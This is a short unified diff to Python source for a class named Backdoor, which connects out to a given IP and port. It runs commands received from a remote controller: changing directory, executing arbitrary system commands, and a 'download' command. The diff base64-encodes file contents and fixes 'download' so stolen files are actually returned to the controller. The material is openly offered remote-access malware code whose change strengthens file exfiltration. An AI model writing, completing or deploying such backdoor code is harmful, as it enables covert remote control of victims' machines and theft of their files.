@@ -1,4 +1,4 @@
-import os, socket, subprocess, json
+import os, socket, subprocess, json, base64
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -27,7 +27,7 @@ class Backdoor:
 
     def read_file(self, path):
         with open(path, 'rb') as file:
-            return file.read()
+            return base64.b64encode(file.read()).decode()
 
     def run(self):
         while True:
@@ -38,7 +38,7 @@ class Backdoor:
             elif command[0] == 'cd' and len(command) > 1:
                 command_result = self.change_working_directory_to(command[1])
             elif command[0] == 'download':
-                self.read_file(command[1])
+                command_result = self.read_file(command[1])
             else:
                 command_result = self.execute_system_command(command)
                 
